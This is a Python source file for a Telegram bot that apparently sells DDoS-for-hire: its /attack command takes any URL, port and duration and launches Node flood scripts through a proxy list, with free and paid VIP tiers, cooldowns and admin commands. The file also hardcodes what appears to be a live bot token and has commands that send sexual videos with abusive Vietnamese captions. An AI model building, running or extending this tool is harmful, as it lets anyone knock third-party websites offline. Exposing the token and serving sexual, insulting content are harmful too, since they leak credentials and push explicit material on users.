import telebot
import json
import random
from datetime import datetime
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import time
import subprocess 

channela = "@Jeromesantos222"
token = "7831532334:AAG4hTFFTiXcBIlUbZVihcWV0IxbNSo-zvM"
bot = telebot.TeleBot(token)
baotri = "baotri.json"
duongdanvideo = ["video/nah.mp4", "video/nah2.mp4", "video/nah3.mp4"]
randomvideo = random.choice(duongdanvideo)
dancervideo = ["dancer/taomachme.mp4", "dancer/binhan1.mp4", "dancer/binhan2.mp4", "dancer/binhan3.mp4"]
randomdancer = random.choice(dancervideo)
database = "database.json"
taomachme = "hentai/taomachme.mp4"
CHANNEL_ID = "7945943780"
CHANNEL_LINK = "https://t.me/Jeromesantos222"

def is_member(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        return member.status in ["member", "administrator", "creator"]
    except:
        return False

def check_access(message):
    user_id = message.from_user.id
    if not is_member(user_id):
        markup = InlineKeyboardMarkup()
        join_button = InlineKeyboardButton("Join Channel Now:)", url=CHANNEL_LINK)
        markup.add(join_button)
        bot.send_message(message.chat.id, "You must join our channel before using this bot!", reply_markup=markup)
        return False
    return True

def kiemtravip(user_id):
    try:
        with open(database, "r") as f:
            data = json.load(f)        
        user_data = data.get(str(user_id), {})
        if user_data.get("vip", False):
            expiry_date = datetime.strptime(user_data.get("expiry", "1970-01-01"), "%Y-%m-%d")
            if expiry_date >= datetime.now():
                return True
        return False
    except FileNotFoundError:
        return False
    except json.JSONDecodeError:
        return False

def kiemtraadmin(user_id):
    try:
        with open(database, "r") as f:
            data = json.load(f)
        user_data = data.get(str(user_id), {})
        return user_data.get("admin", False)
    except FileNotFoundError:
        return False
    except json.JSONDecodeError:
        return False

def get_user_data(user_id):
    try:
        with open(database, "r") as f:
            data = json.load(f)
        user_data = data.get(str(user_id), {})
        
        max_time = int(user_data.get("time", 120 if kiemtravip(user_id) else 60))
        cooldown = int(user_data.get("cooldown", 60 if kiemtravip(user_id) else 90))
        last_attack = user_data.get("last_attack", 0)
        
        return max_time, cooldown, last_attack
    except FileNotFoundError:
        return (120 if kiemtravip(user_id) else 60), (60 if kiemtravip(user_id) else 90), 0
    except json.JSONDecodeError:
        print(f"Error: Invalid JSON format in {database}. Using default values.")
        return (120 if kiemtravip(user_id) else 60), (60 if kiemtravip(user_id) else 90), 0

def set_cooldown(user_id):
    try:
        with open(database, "r") as f:
            data = json.load(f)
    except FileNotFoundError:
        data = {}
    except json.JSONDecodeError:
        data = {}
    user_data = data.setdefault(str(user_id), {})
    user_data["last_attack"] = time.time()
    with open(database, "w") as f:
        json.dump(data, f, indent=4)

def check_maintenance(function_name):
    try:
        with open(baotri, "r") as f:
            data = json.load(f)
        if str(data.get("baotritatca", "false")).lower() == "true":
            return True
        return str(data.get(function_name, "false")).lower() == "true"
    except (FileNotFoundError, json.JSONDecodeError):
        return False

def attack_https_normal(url, port, time_attack, message):
    if check_maintenance("https-normal"):
        bot.reply_to(message, "Feature Under Maintenance")
        return
    if not check_access(message):
        return
    user_id = message.from_user.id
    is_vip = kiemtravip(user_id)
    username = message.from_user.username if message.from_user.username else "Unknown"
    with open(randomvideo, "rb") as video:
        bot.send_video(message.chat.id, video, caption=f"""
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
Attack Successfully Sent To Server
[🍁] Target : {url}
[🍁] Port : {port}
[🍁] Duration : {time_attack}
[🍁] Method : https-normal
[🍁] VIP : {is_vip}
[🍁] UserName : {username}
Notes : Don't Spam Attacks
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
        """)
    subprocess.Popen(["node", "bestflood.js", url, str(time_attack), "5", "5", "proxy.txt", "flood"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def attack_https_bypass(url, port, time_attack, message):
    if check_maintenance("https-bypass"):
        bot.reply_to(message, "Feature Under Maintenance")
        return
    if not check_access(message):
        return
    user_id = message.from_user.id
    is_vip = kiemtravip(user_id)
    username = message.from_user.username if message.from_user.username else "Unknown"
    with open(randomvideo, "rb") as video:
        bot.send_video(message.chat.id, video, caption=f"""
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
Attack Successfully Sent To Server
[🍁] Target : {url}
[🍁] Port : {port}
[🍁] Duration : {time_attack}
[🍁] Method : https-bypass
[🍁] VIP : {is_vip}
[🍁] UserName : {username}
Notes : Don't Spam Attacks
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
        """)
    subprocess.Popen(["node", "bypass.js", url, str(time_attack), "64", "2", "proxy.txt"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def attack_https_destroy(url, port, time_attack, message):
    if check_maintenance("https-destroy"):
        bot.reply_to(message, "Feature Under Maintenance")
        return
    if not check_access(message):
        return
    user_id = message.from_user.id
    is_vip = kiemtravip(user_id)
    username = message.from_user.username if message.from_user.username else "Unknown"
    with open(randomvideo, "rb") as video:
        bot.send_video(message.chat.id, video, caption=f"""
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
Attack Successfully Sent To Server
[🍁] Target : {url}
[🍁] Port : {port}
[🍁] Duration : {time_attack}
[🍁] Method : https-destroy
[🍁] VIP : {is_vip}
[🍁] UserName : {username}
Notes : Don't Spam Attacks
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
        """)
    subprocess.Popen(["node", "bestflood.js", url, str(time_attack), "64", "2", "proxy.txt", "bypass"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def attack_https_star(url, port, time_attack, message):
    if check_maintenance("https-star"):
        bot.reply_to(message, "Feature Under Maintenance")
        return
    if not check_access(message):
        return
    user_id = message.from_user.id
    is_vip = kiemtravip(user_id)
    username = message.from_user.username if message.from_user.username else "Unknown"
    with open(randomvideo, "rb") as video:
        bot.send_video(message.chat.id, video, caption=f"""
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
Attack Successfully Sent To Server
[🍁] Target : {url}
[🍁] Port : {port}
[🍁] Duration : {time_attack}
[🍁] Method : https-star
[🍁] VIP : {is_vip}
[🍁] UserName : {username}
Notes : Don't Spam Attacks
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
        """)
    subprocess.Popen(["node", "h2-godly.js", url, str(time_attack), "64", "2", "proxy.txt"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

@bot.message_handler(commands=['baotri'])
def baotri_command(message):
    if not check_access(message):
        return
    sender_id = message.from_user.id
    if not kiemtraadmin(sender_id):
        bot.reply_to(message, "You Do Not Have Sufficient Permissions To Use This Command")
        return
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "Example: /baotri <function> (e.g., /baotri help, /baotri all)")
            return
        function = args[1].lower()
        valid_functions = ["all", "help", "method", "https-normal", "https-bypass", "https-destroy", "https-star", "attack", "addvip", "rmvip", "plan"]
        if function not in valid_functions:
            bot.reply_to(message, f"Invalid function! Valid options: {', '.join(valid_functions)}")
            return

        try:
            with open(baotri, "r") as f:
                data = json.load(f)
        except FileNotFoundError:
            data = {"help": False, "method": False, "https-normal": False, "https-bypass": False, "https-destroy": False, "https-star": False, "attack": False, "addvip": False, "rmvip": False, "plan": False, "baotritatca": False}
        except json.JSONDecodeError:
            data = {"help": False, "method": False, "https-normal": False, "https-bypass": False, "https-destroy": False, "https-star": False, "attack": False, "addvip": False, "rmvip": False, "plan": False, "baotritatca": False}

        if function == "all":
            data["baotritatca"] = True
            bot.reply_to(message, "All functions are now under maintenance!")
        else:
            data[function] = True
            bot.reply_to(message, f"Function {function} is now under maintenance!")

        with open(baotri, "w") as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

@bot.message_handler(commands=['bobaotri'])
def bobaotri_command(message):
    if not check_access(message):
        return
    sender_id = message.from_user.id
    if not kiemtraadmin(sender_id):
        bot.reply_to(message, "You Do Not Have Sufficient Permissions To Use This Command")
        return
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "Example: /bobaotri <function> (e.g., /bobaotri help, /bobaotri all)")
            return
        function = args[1].lower()
        valid_functions = ["all", "help", "method", "https-normal", "https-bypass", "https-destroy", "https-star", "attack", "addvip", "rmvip", "plan"]
        if function not in valid_functions:
            bot.reply_to(message, f"Invalid function! Valid options: {', '.join(valid_functions)}")
            return

        try:
            with open(baotri, "r") as f:
                data = json.load(f)
        except FileNotFoundError:
            data = {"help": False, "method": False, "https-normal": False, "https-bypass": False, "https-destroy": False, "https-star": False, "attack": False, "addvip": False, "rmvip": False, "plan": False, "baotritatca": False}
        except json.JSONDecodeError:
            data = {"help": False, "method": False, "https-normal": False, "https-bypass": False, "https-destroy": False, "https-star": False, "attack": False, "addvip": False, "rmvip": False, "plan": False, "baotritatca": False}

        if function == "all":
            data["baotritatca"] = False
            bot.reply_to(message, "All functions are now active!")
        else:
            data[function] = False
            bot.reply_to(message, f"Function {function} is now active!")

        with open(baotri, "w") as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

@bot.message_handler(commands=['addvip'])
def addvip(message):
    if check_maintenance("addvip"):
        bot.reply_to(message, "Feature Under Maintenance")
        return
    if not check_access(message):
        return
    sender_id = message.from_user.id
    if not kiemtraadmin(sender_id):
        bot.reply_to(message, "You Do Not Have Sufficient Permissions To Use This Command")
        return
    try:
        command_args = message.text.split()
        if len(command_args) < 4:
            bot.reply_to(message, "Example: /addvip <user_id> <expiry> <time> [cooldown]")
            return

        user_id = command_args[1]
        expiry = command_args[2]
        time = command_args[3]
        cooldown = command_args[4] if len(command_args) > 4 else "60"
        try:
            expiry_date = datetime.strptime(expiry, "%Y-%m-%d")
            if expiry_date < datetime.now():
                bot.reply_to(message, "Expiry Date Must Be Greater Than Today")
                return
        except ValueError:
            bot.reply_to(message, "Add Type Expiry: 2025-01-01")
            return
        try:
            with open(database, "r") as f:
                data = json.load(f)
        except FileNotFoundError:
            data = {}
        except json.JSONDecodeError:
            data = {}
        data[user_id] = {
            "vip": True,
            "expiry": expiry,
            "admin": data.get(user_id, {}).get("admin", False),
            "time": time,
            "cooldown": cooldown,
            "last_attack": data.get(user_id, {}).get("last_attack", 0)
        }
        with open(database, "w") as f:
            json.dump(data, f, indent=4)

        bot.reply_to(message, f"Added : {user_id} Expired : {expiry_date.strftime('%Y-%m-%d')}!")
    except Exception as e:
        bot.reply_to(message, f"Error : {e}")

@bot.message_handler(commands=['rmvip'])
def rmvip(message):
    if check_maintenance("rmvip"):
        bot.reply_to(message, "Feature Under Maintenance")
        return
    if not check_access(message):
        return
    sender_id = message.from_user.id
    if not kiemtraadmin(sender_id):
        bot.reply_to(message, "You Do Not Have Sufficient Permissions To Use This Command")
        return
    try:
        command_args = message.text.split()
        if len(command_args) != 2:
            bot.reply_to(message, "Example: /rmvip <user_id>")
            return

        user_id = command_args[1]
        try:
            with open(database, "r") as f:
                data = json.load(f)
        except FileNotFoundError:
            bot.reply_to(message, f"Database not found, no data to remove!")
            return
        except json.JSONDecodeError:
            bot.reply_to(message, f"Invalid database format, cannot remove data!")
            return

        if str(user_id) not in data:
            bot.reply_to(message, f"User {user_id} not found in database!")
            return

        if not data[str(user_id)].get("vip", False):
            bot.reply_to(message, f"User {user_id} is not a VIP!")
            return

        del data[str(user_id)]
        with open(database, "w") as f:
            json.dump(data, f, indent=4)

        bot.reply_to(message, f"Removed VIP status and data for user {user_id} successfully!")
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

@bot.message_handler(commands=['plan'])
def plan(message):
    if check_maintenance("plan"):
        bot.reply_to(message, "Feature Under Maintenance")
        return
    if not check_access(message):
        return
    user_id = message.from_user.id
    try:
        with open(database, "r") as f:
            data = json.load(f)
        user_data = data.get(str(user_id), {})
        
        username = message.from_user.username if message.from_user.username else "Unknown"
        is_vip = kiemtravip(user_id)
        max_time, cooldown, _ = get_user_data(user_id)
        expiry = user_data.get("expiry", "Not Set")
        
        caption = f"""
  👤 Welcome To Account Menu 👤
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
[🌸] UserName: {username}
[🍀] Vip: {is_vip}
[🍁] Max_Time: {max_time}s
[🌺] Cooldown: {cooldown}s
[🏵️] Expiry: {expiry}
[🍃] Channel: {channela}
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
        """
        with open(randomvideo, "rb") as video:
            bot.send_video(message.chat.id, video, caption=caption)
    except FileNotFoundError:
        caption = f"""
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
[🌸] UserName: {message.from_user.username if message.from_user.username else "Unknown"}
[🍀] Vip: False
[🍁] Max_Time: 60s
[🌺] Cooldown: 90s
[🏵️] Expiry: Not Set
[🍃] Channel: {channela}
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
        """
        with open(randomvideo, "rb") as video:
            bot.send_video(message.chat.id, video, caption=caption)
    except json.JSONDecodeError:
        caption = f"""
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
[🌸] UserName: {message.from_user.username if message.from_user.username else "Unknown"}
[🍀] Vip: False
[🍁] Max_Time: 60s
[🌺] Cooldown: 90s
[🏵️] Expiry: Not Set
[🍃] Channel: {channela}
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
        """
        with open(randomvideo, "rb") as video:
            bot.send_video(message.chat.id, video, caption=caption)
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

@bot.message_handler(commands=['methods'])        
def method(message):
    if check_maintenance("method"):
        bot.reply_to(message, "Feature Under Maintenance")
        return
    if not check_access(message):
        return
    try:
        with open(randomvideo, "rb") as video:
            bot.send_video(message.chat.id, video, caption=
            """
 📌 Methods For TreTrau_Bot 📌
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
 🍁 https-normal : normal script
 🍁 https-bypass : bypass server
 🏵️ https-destroy : destroy you server
 🏵️ https-star : star ddos attack
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
 ❄️ Tips In Methods Function ❄️
 🍁 Free Plan
 🏵️ Vip Plan
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
           """)
    except FileNotFoundError:
        bot.reply_to(message, "Khong Tim Thay File Video!!!")
    except Exception as e:
        bot.reply_to(message, f"Da Xay Ra Loi {e}")

@bot.message_handler(commands=['attack'])
def attack(message):
    if check_maintenance("attack"):
        bot.reply_to(message, "Feature Under Maintenance")
        return
    if not check_access(message):
        return
    user_id = message.from_user.id
    max_time, cooldown, last_attack = get_user_data(user_id)
    elapsed = time.time() - last_attack
    if elapsed < cooldown:
        bot.reply_to(message, f"Please wait {int(cooldown - elapsed)} seconds before using this command again.")
        return
    try:
        args = message.text.split()
        if len(args) != 5:
            bot.reply_to(message, "Example: /attack <url> <port> <time> <method>")
            return
        url = args[1]
        port = int(args[2])
        time_attack = int(args[3])
        method = args[4]
        free_methods = ["https-normal", "https-bypass"]
        vip_methods = ["https-destroy", "https-star"]
        if method not in free_methods + vip_methods:
            bot.reply_to(message, "Invalid method! Commands /methods To Learn More")
            return

        if method in vip_methods and not kiemtravip(user_id):
            bot.reply_to(message, "This method require VIP")
            return

        if time_attack > max_time:
            bot.reply_to(message, f"Max attack time is {max_time} seconds for your plan!")
            return

        if method == "https-normal":
            attack_https_normal(url, port, time_attack, message)
        elif method == "https-bypass":
            attack_https_bypass(url, port, time_attack, message)
        elif method == "https-destroy":
            attack_https_destroy(url, port, time_attack, message)
        elif method == "https-star":
            attack_https_star(url, port, time_attack, message)

        set_cooldown(user_id)
    except ValueError:
        bot.reply_to(message, "Port and time must be numbers!")
    except IndexError:
        bot.reply_to(message, "Example: /attack <url> <port> <time> <method>")
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

@bot.message_handler(commands=['ping'])
def ping(message):
    if not check_access(message):
        return
    bot.reply_to(message, "pongg")

@bot.message_handler(commands=['dancer'])
def dancerfunc(message):
    if not check_access(message):
        return
    try:
        argss = message.text.split()
        luachon = argss[1] if len(argss) > 1 else ""
        if "binhan" in luachon:
            if randomdancer == "dancer/taomachme.mp4":
                tinnhan = 'Tao Mach Me Nha Con:)'
            else:
                tinnhan = 'Lon Roi Xem Binh An It Thoi Vo @tretraunetwork Di Xem Con Cac'
            with open(randomdancer, "rb") as video:
                bot.send_video(message.chat.id, video, caption=f"{tinnhan}")
    except IndexError:
        bot.reply_to(message, "Example: /dancer")
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

@bot.message_handler(commands=['hentai'])
def hentai(message):
    if not check_access(message):
        return
    with open(taomachme, "rb") as video:
        bot.send_video(message.chat.id, video, caption="Dit Me May Chet May Chet Nha Con:)")

@bot.message_handler(commands=['help'])
def help(message):
    if check_maintenance("help"):
        bot.reply_to(message, "Feature Under Maintenance")
        return
    if not check_access(message):
        return
    try:
        with open(randomvideo, "rb") as video:
            bot.send_video(message.chat.id, video, caption=
            """
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
 ~ ~ Help Menu For TreTrau_Bot ~ ~ 
• /methods : Methods For & Spam SMS
• /plan : Show Administration & Account
• /dancer : Random Video Tiktok In Storage
• /hentai : Random Link Sex VN, Hentai 2025
• /attack : DDoS Attack  With Best Script
• /addvip : Added Vip Plan In Bot
• /rmvip : Remove Vip Plan In Bot
• /baotri : Set Maintenance Mode
• /bobaotri : Unset Maintenance Mode
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
""")
    except FileNotFoundError:
        bot.reply_to(message, "Khong Tim Thay File Video!!!")
    except Exception as e:
        bot.reply_to(message, f"Da Xay Ra Loi: {e}")

print("Bot Runs Successfully")
print("Telegram Channel : https://t.me/tretraunetwork")
bot.polling()